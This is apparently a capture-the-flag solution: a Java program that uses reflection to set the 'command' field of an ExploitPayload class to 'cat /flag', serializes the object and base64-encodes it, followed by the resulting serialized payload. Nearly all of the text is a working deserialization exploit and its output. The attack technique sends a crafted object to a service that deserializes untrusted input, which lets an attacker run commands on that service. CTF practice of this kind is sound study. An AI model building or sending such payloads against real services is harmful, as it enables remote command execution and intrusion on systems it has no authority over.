```java
import com.ctf.readobject_demo.ExploitPayload;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class GeneratePayload {
    public static void main(String[] args) {

        String command = "cat /flag";
        String fileName = "payload.b64";

        try {
            // 创建实例
            ExploitPayload payload = new ExploitPayload();
            // 使用反射设置命令变量
            setPrivateField(payload, "command", command);
            // 序列化对象
            byte[] serializedData = serialize(payload);
            // Base64 编码
            String base64Data = Base64.getEncoder().encodeToString(serializedData);
            // 保存到文件
            saveToFile(fileName, base64Data);
        } catch (Exception e) {
            System.err.println("Error generating payload:");
            e.printStackTrace();
        }
    }

    private static void setPrivateField(Object obj, String fieldName, Object value)
            throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = obj.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static byte[] serialize(Serializable obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            return baos.toByteArray();
        }
    }

    private static void saveToFile(String fileName, String content) throws IOException {
        try (FileWriter writer = new FileWriter(fileName)) {
            writer.write(content);
        }
    }
}
```

rO0ABXNyACZjb20uY3RmLnJlYWRvYmplY3RfZGVtby5FeHBsb2l0UGF5bG9hZAAAAAAAAAABAgACTAAHY29tbWFuZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABnJlc3VsdHEAfgABeHB0AAljYXQgL2ZsYWd0AAlObyByZXN1bHQ=
